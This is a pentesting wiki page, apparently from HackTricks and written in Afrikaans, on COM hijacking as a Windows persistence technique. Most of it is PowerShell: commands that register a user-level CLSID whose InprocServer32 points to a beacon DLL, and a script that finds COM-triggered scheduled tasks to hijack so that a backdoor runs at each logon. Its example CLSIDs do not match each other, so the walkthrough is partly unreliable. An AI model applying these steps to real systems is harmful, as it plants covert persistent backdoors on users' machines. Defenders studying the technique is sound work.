# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Soek na nie-bestaande COM-komponente

Aangesien die waardes van HKCU deur die gebruikers gewysig kan word, kan **COM Hijacking** as 'n **volhardende meganisme** gebruik word. Deur `procmon` te gebruik, is dit maklik om gesoekte COM-registers te vind wat nie bestaan nie, wat 'n aanvaller kan skep om volhardend te wees. Filters:

- **RegOpenKey** operasies.
- waar die _Result_ **NAAM NIE GEVIND NIE** is.
- en die _Path_ eindig met **InprocServer32**.

Sodra jy besluit het watter nie-bestaande COM om te verpersoonlik, voer die volgende opdragte uit. _Wees versigtig as jy besluit om 'n COM te verpersoonlik wat elke paar sekondes gelaai word, aangesien dit oorbodig kan wees._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackbare Taak Skeduleerder COM-komponente

Windows Take gebruik Aangepaste Triggers om COM-objekte aan te roep en omdat hulle deur die Taak Skeduleerder uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.

<pre class="language-powershell"><code class="lang-powershell"># Wys COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Taak Naam: " $Task.TaskName
Write-Host "Taak Pad: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Voorbeeld Uitset:
<strong># Taak Naam:  Voorbeeld
</strong># Taak Pad:  \Microsoft\Windows\Voorbeeld\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [meer soos die vorige een...]</code></pre>

Deur die uitset te kontroleer, kan jy een kies wat **elke keer 'n gebruiker aanmeld** gaan uitvoer, byvoorbeeld.

Soek nou vir die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** en in HKLM en HKCU, jy sal gewoonlik vind dat die waarde nie in HKCU bestaan nie.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dan kan jy net die HKCU-invoer skep en elke keer wanneer die gebruiker aanmeld, sal jou backdoor geaktiveer word.

{{#include ../../banners/hacktricks-training.md}}
